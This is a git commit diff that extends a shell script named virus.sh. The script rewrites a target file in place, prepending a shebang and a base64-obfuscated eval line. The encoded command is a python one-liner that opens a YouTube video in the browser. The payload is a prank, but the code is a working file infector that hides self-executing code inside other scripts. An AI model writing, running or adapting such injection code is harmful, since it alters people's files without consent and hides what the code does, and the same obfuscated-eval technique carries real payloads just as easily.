28b2fe1dfa85ad4df100e8d0727c1ee1292936d5
NewDawn0 <92283105+NewDawn0@users.noreply.github.com>
2022-04-11 22:34:09 +0200

    polished the basic file

--- virus.sh
+++ virus.sh
@@ -1,2 +1,5 @@
 file=$1
+awk -i inplace 'BEGINFILE{print"#!/bin/sh"}{print}' $file
 awk -i inplace 'BEGINFILE{print"eval $(echo \"cHl0aG9uIC1jICJpbXBvcnQgd2ViYnJvd3Nlcjsgd2ViYnJvd3Nlci5vcGVuKFwiaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUVwiKSIK\" | base64 -d)"}{print}' $file
+awk -i inplace 'BEGINFILE{print""}{print}' $file
+
